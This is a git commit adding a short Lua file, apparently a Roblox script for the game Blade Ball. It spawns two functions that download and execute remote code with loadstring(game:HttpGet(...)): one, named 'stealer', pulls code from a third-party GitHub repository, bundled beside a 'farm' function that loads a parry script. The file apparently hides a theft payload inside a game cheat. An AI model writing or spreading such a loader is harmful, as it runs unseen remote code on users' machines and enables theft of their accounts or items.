d109331627a8f549322b3697d9b851c3b197beb4
ThisIsDesirelesss <86536855+ThisIsDesirelesss@users.noreply.github.com>
2025-05-07 23:33:48 +0200

    Create shush.lua

---
+++ shush.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScripterzNation/bladeball/refs/heads/main/mainfunc.lua'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ThisIsDesirelesss/myscripts/refs/heads/main/best_parry.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
